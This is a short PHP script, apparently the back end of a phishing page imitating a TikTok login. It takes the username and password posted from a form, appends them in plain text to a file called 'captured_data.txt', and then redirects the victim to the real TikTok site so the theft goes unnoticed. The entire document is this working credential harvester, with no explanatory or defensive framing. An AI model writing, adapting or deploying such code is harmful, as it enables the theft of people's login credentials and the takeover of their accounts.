<?php
$username = $_POST['user'];
$password = $_POST['pass'];
$file = fopen("captured_data.txt", "a");
fwrite($file, "User: " . $username . " | Pass: " . $password . "\n");
fclose($file);
header("Location: https://www.tiktok.com");
exit();
?>
